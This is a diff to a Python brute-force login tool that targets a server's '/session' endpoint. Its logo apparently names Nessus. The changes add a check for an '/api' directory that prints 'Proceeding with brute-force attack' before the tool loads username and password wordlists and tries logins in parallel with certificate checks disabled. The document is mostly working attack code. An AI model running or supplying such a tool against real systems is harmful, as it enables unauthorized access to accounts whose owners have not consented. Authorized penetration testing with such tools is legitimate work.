@@ -1,6 +1,5 @@
 #!/bin/python3
 
-
 import requests
 import json
 import argparse
@@ -9,7 +8,7 @@ import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from colorama import Fore, Style, init
 
-logo='''
+logo = '''
  /$$   /$$                                                         /$$      /$$
 | $$$ | $$                                                        | $$$    /$$$
 | $$$$| $$  /$$$$$$   /$$$$$$$ /$$$$$$$ /$$   /$$  /$$$$$$$       | $$$$  /$$$$
@@ -34,8 +33,22 @@ parser.add_argument('--protocol', type=str, choices=['http', 'https'], default='
 args = parser.parse_args()
 
 url = f"{args.protocol}://{args.ip}:{args.port}/session"
+api_check_url = f"{args.protocol}://{args.ip}:{args.port}/api"
 
 found_valid_credentials = False
+
+def check_api_directory():
+    try:
+        response = requests.get(api_check_url, verify=False)
+        if response.status_code == 200:
+            print(Fore.GREEN + "[*] API directory exists. Proceeding with brute-force attack." + Style.RESET_ALL)
+            return True
+        else:
+            print(Fore.RED + "[!] API directory not found. Exiting." + Style.RESET_ALL)
+            return False
+    except requests.RequestException as e:
+        print(Fore.RED + f"[!] Error checking API directory: {e}" + Style.RESET_ALL)
+        return False
 
 def try_login(username, password):
     global found_valid_credentials
@@ -64,6 +77,9 @@ def display_spinner():
             time.sleep(0.1)
 
 def main():
+    if not check_api_directory():
+        return
+
     with open(args.username_file, "r", encoding="latin1") as uf:
         users = [line.strip() for line in uf]
 
